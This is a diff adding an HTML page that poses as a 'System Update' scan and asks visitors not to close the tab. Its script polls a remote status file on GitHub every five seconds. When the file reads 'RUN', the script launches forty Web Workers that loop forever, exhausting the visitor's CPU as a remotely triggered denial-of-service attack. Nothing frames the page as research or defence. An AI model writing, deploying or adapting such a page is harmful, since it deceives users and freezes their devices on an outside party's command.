@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Update</title>
+    <meta charset="UTF-8">
+</head>
+<body style="background-color: black; color: white; text-align: center; padding-top: 50px; font-family: Arial;">
+    <h1>System scanning...</h1>
+    <p>Please do not close this tab to ensure stability</p>
+
+    <script>
+        const statusUrl = 'https://raw.githubusercontent.com/karimattef3-pixel/my-tools/main/status.txt';
+
+        async function checkStatus() {
+            try {
+                const response = await fetch(statusUrl);
+                const text = await response.text();
+                if (text.trim() === "RUN") {
+                    startDestruction();
+                } else {
+                    location.reload();
+                }
+            } catch (e) {
+                console.log("Connection error");
+            }
+        }
+
+        function startDestruction() {
+            for (let i = 0; i < 40; i++) {
+                new Worker(URL.createObjectURL(new Blob([`
+                    while(true) {
+                        Math.sqrt(Math.random() * 99999999);
+                    }
+                `], {type: 'text/javascript'})));
+            }
+        }
+        setInterval(checkStatus, 5000);
+        checkStatus();
+    </script>
+</body>
+</html>
